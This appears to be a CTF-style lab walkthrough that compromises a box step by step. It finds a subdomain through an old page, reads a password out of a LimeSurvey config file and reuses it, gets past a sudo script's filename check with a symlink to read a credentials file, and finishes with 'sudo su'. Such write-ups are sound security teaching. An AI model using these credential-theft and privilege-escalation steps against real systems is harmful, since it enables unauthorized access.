#box

*Created: 1/14/2026*

### Step 1

**Tags:** #HTML-Source-Code #Old-Instances #Subdomain

**Command:**
```http
In order to better understand the wishes of your target group, we provide surveys <a href="//customers-survey.marketing.pg">here</a></p>
```

*Port: 80 | 💎 GEM*

> 
> On port 80 we discover a website, after a quick fuzzing we discover an `/old` endpoint which seems to be storing an old version of the website. In fact, carefully looking through the index we discover that on the carousel a "Survey" section is present (it was redacted from the actual website). That Survey section highlights the presence of subdomain named `customers-survey.marketing.pg`

---

### Step 2

**Tags:** #Credentials-Leak #Credential-Reuse #LimeSurvey

**Command:**
```bash
cat /var/www/LimeSurvey/application/config/config.php | grep password
su t.miller # with password EzPwz2022_dev1$$23!!

```

> 
> On the given subdomain we discover the presence of a config file inside `/var/www/html/Limesurvey/application/config/config.php`. Inside that file a password is shown, we discover that password works out for the user `t.miller` and we manage to get lateral movement onto that user.

---

### Step 3

**Tags:** #Symlink #sudo-Privileges #mlocate #mlocate.db #sudo-Impersonation

**Command:**
```bash
# Finds the mlocate.db file
strings mlocate.db | grep /home/m.sander/personal/ -A 5

# Create a symlink to bypass the `/usr/bin/sync.sh` restriction
ln -sf /home/m.sander/personal/ foo

# Executes `/usr/bin/sync.sh` as `m.sander` pointing at symlink at foo to read creds-for-2022.txt
sudo -H -u m.sander /usr/bin/sync.sh foo/creds-for-2022.txt
```

> 
> At this point the privilege escalation method is a bit tricky. An `mlocate.db` file exposes a file present in the `/home/m.sander/personal` folder called `creds-for-2022.txt`. This file contains a password which can be read by executing `/usr/bin/sync.sh` that our user, `t.miller` can execute impersonating `m.sander`. Read this file, we have the credentials to laterally move to `m.sander`
> 
> This privilege escalation is performed by chaining two settings assigned to our current user `t.miller`. 
> In fact, our user can run a specific script `/usr/bin/sync.sh` while impersonating the user `m.sander`. 
> The script in question performs the following:
> 
```bash
#! /bin/bash
if [ -z $1 ]; then
    echo "error: note missing"
    exit
fi
note=$1
if [[ "$note" =~ .*m.sander.* ]]; then
    echo "error: forbidden"
    exit
fi
difference=$(diff /home/m.sander/personal/notes.txt $note)
if [[ -z $difference ]]; then
    echo "no update"
    exit
fi
echo "Difference: $difference"
cp $note /home/m.sander/personal/notes.txt
echo "[+] Updated."
```
> 
> In particular, it seems this file is basically showing the differences between one arbitrary file selected by us (that the user `m.sander` can read and the file from `/home/m.sander/personal/notes.txt`. Once it shows the differences, the file input by us will be copied into `/home/m.sander/personal/notes.txt` replacing the previous one.
> 
> ---
> 
> At the same time, our user belongs to the `mlocate` group, a quick search of the SGID bits identifies that the `mlocate` users can actually run `/usr/bin/mlocate`, and by doing `man mlocate` we see how the description of the command cites:
> 
```txt
locate  reads  one or more databases prepared by updatedb(8) and writes file names matching at least one of the PATTERNs to standard output, one per line.
```
> 
> Going further down, the manual also tells us the location of the default database, being:
> 
```txt
FILES
       /var/lib/mlocate/mlocate.db
              The database searched by default.
```
> 
> Printing `cat /var/lib/mlocate/mlocate.db` returns a binary result. We could user `strings` to check it out, but unfortunately it's not available on the target machine. So we transfer it on our end and use `strings` on it.
> 
> Since we've already tried looking at `/etc/shadow` but it didn't work, we want to check whether there's anything located inside the `/home/m.sander/personal/` folder, other than `notes.txt`.
> To do that, we can use the following command that, whenever greps finds a result, prints 5 lines below it.
> 
```bash
strings mlocate.db | grep /home/m.sander/personal/ -A 5
```
> 
> For how the `mlocate.db` is structured, once the folder is identified, everything which is below that folder is its content. In that case, we find `notes.txt` and something else that definitely stands out:
> 
```txt
/home/m.sander/personal
creds-for-2022.txt
notes.txt
/home/t.miller
.bash_logout
.bashrc
```
> 
> At this point, it'd be natural to use the script to read that file:
> 
```bash
sudo -H -u m.sander /usr/bin/sync.sh /home/m.sander/personal/creds-for-2022.txt
```
> 
> But a script rule forbids to have `*m.sander*` inside the file name.
> 
> To bypass that, we must create a symlink that points to `/home/m.sander/personal`. To do that we can use:
> 
```bash
ln -sf /home/m.sander/personal/ foo
```
> 
> This will create a symlink between those two folder, thus now we'll be able to target the `creds-for-2022.txt` file without the need of specifying `m.sander` in the name of the file.
> 
> Finally, we can read that file successfully with:
> 
```bash
sudo -H -u m.sander /usr/bin/sync.sh foo/creds-for-2022.txt
```

---

### Step 4

**Tags:** #GTFOBins #sudo-Privileges

**Command:**
```bash
sudo su
```

> 
> After moving laterally to `m.sander` with password `EzPwz2022_12345678#!` , we realize that this user belongs to the sudo group. We can rapidly escalated with `sudo su` having the password of `m.sander`

---

